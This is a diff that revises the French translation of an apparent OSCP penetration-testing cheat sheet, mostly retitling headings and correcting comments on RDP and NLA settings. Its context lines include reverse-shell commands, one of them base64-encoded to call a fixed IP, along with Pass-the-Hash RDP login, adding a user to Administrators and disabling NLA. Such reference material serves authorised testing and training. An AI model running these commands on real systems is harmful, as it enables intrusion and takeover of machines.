@@ -91,7 +91,7 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<
 ```
 
 
-### Montant net
+### Netcat
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -197,7 +197,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin
 ```
 
 
-### Tool for Generating Reverse Shell
+### Outil pour générer un shell inversé (Reverse Shell)
 
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
@@ -212,7 +212,7 @@ shellrator
 ```
 
 
-### Adjust Interactive Shells
+### Améliorer les shells interactifs
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « Adjust Interactive Shells ».</p>
@@ -322,7 +322,7 @@ Examiner les permissions et la configuration de Linux.
 Examiner les objets, les droits et les services du domaine.
 
 
-#### Other Utilitaires
+#### Autres utilitaires
 
 
 <p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>
@@ -364,7 +364,7 @@ Examiner les objets, les droits et les services du domaine.
 Examiner les objets, les droits et les services du domaine.
 
 
-### Utilisation des pouvoirs
+### Connexion RDP avec identifiant et mot de passe
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -377,7 +377,7 @@ xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboa
 ```
 
 
-### Utilisation de Hashes
+### Connexion RDP avec un hash NTLM (Pass-the-Hash)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -391,7 +391,7 @@ xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resol
 ```
 
 
-### Demande de pouvoirs
+### Connexion RDP avec rdesktop
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -405,7 +405,7 @@ rdesktop [IP]
 ```
 
 
-### Général RDP Connexion
+### Connexion RDP avec paramètres personnalisés
 
 
 <p class="oscp-command-note">Ouvrir une session RDP.</p>
@@ -426,20 +426,20 @@ rdesktop [IP] -u [user] -p [password] -g 80%+150+100
 ```
 
 
-### Activer RDP En cas de handicap
+### Activer RDP lorsqu’il est désactivé
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Enable RDP If Disabled ».</p>
+<p class="oscp-command-note">Vérifier la configuration RDP et l’authentification NLA avec PowerShell.</p>
 
 ```powershell
 $ComputerName = hostname
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
-# Si le résultat est 1 alors RDP est désactivé
+# Si le résultat est 1, l’authentification NLA est requise ; cela n’indique pas si RDP est activé
 
-# Définir les informations NLA à désactivées pour permettre RDP
+# Ne plus exiger l’authentification NLA (cela n’active pas RDP)
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
 
-# Définir les informations NLA pour permettre de refuser RDP
+# Exiger l’authentification NLA pour les connexions RDP
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)
 
 ```
@@ -506,78 +506,78 @@ Add-ADGroupMember -Identity "Administrators" -Members [username]
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-# 6. Connect to RDP
+# 6. Se connecter via RDP
 rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 
 ```
 
 
-## Decoding Techniques
+## Techniques de décodage et d’encodage
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# Decode
+# Décoder
 echo "72 101 108 108 111" | awk '{for(i=1;i<=NF;i++) printf("%c",$i)}'
 
-# Encode
+# Encoder
 echo -n "Hello" | od -An -t uC | tr -d ' \n'
 
 ```
 
 
 ```bash
-# Decode
+# Décoder
 echo "SGVsbG8gd29ybGQ=" | base64 -d
 
-# Encode
+# Encoder
 echo "Hello world" | base64
 
 ```
 
 
 ```bash
-# Decode
+# Décoder
 echo "48656c6c6f20776f726c64" | xxd -r -p
 
-# Encode
+# Encoder
 echo "Hello world" | xxd -p
 
 ```
 
 
 ```bash
-# Decode
+# Décoder
 echo "dlrow olleH" | rev
 
-# Encode
+# Encoder
 echo "Hello world" | rev
 
 ```
 
 
 ```bash
-# Decode
+# Décoder
 echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
-# Encode
+# Encoder
 echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
 ```
 
 
 ```bash
-# Decode
+# Décoder
 echo "Hello%20World%21" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))"
 
-# Encode
+# Encoder
 echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))"
 
 ```
 
 
-### De base Requests
+### Requêtes HTTP de base
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -634,7 +634,7 @@ curl -X DELETE http://example.com/delete
 ```
 
 
-### Authentification and Headers
+### Authentification et en-têtes HTTP
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -652,7 +652,7 @@ curl -A "CustomUserAgent/1.0" http://example.com
 ```
 
 
-### Response Handling
+### Gestion des réponses HTTP
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -691,7 +691,7 @@ curl -v http://example.com
 ```
 
 
-### Cookies and Session Management
+### Cookies et gestion des sessions
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -734,7 +734,7 @@ curl -C - -o filename http://example.com/file
 ```
 
 
-### Proxy and Security
+### Proxy et options de sécurité
 
 Configurer et comprendre les chemins de communication réseau.
 
@@ -754,7 +754,7 @@ curl -k https://example.com
 ```
 
 
-### Complémentaire Options
+### Options complémentaires
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -786,7 +786,7 @@ curl --http2 http://example.com
 ```
 
 
-## Generate a SSH Key
+## Générer une clé SSH
 
 
 
@@ -897,19 +897,19 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Cross Compiling for Windows ».</p>
+<p class="oscp-command-note">Commandes de compilation croisée vers Windows.</p>
 
 ```bash
-# Cross-Compile the C Code to a 64-bit Application
+# Compiler le code C pour produire une application Windows 64 bits
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
-# Cross-Compile the C Code to a DLL
+# Compiler le code C pour produire une DLL Windows
 x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
 
 ```
 
 
-## Managing Flags
+## Retrouver les fichiers de preuve (Flags)
 
 
 <p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
@@ -932,7 +932,7 @@ hostname && whoami && type [local/proof].txt && ipconfig /all
 ```
 
 
-## Complémentaire Tips
+## Conseils complémentaires
 
 
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
@@ -1035,7 +1035,7 @@ echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Complémentaire Tips ».</p>
+<p class="oscp-command-note">Script PowerShell pour les conseils complémentaires.</p>
 
 ```powershell
 # Trouver un fichier
@@ -1048,7 +1048,7 @@ netstat -lntp
 # Liste tous les fichiers SUID
 find / -perm -4000 2>/dev/null
 
-# Determine version of Linux
+# Afficher la version de Linux
 cat /etc/issue
 uname -a
 
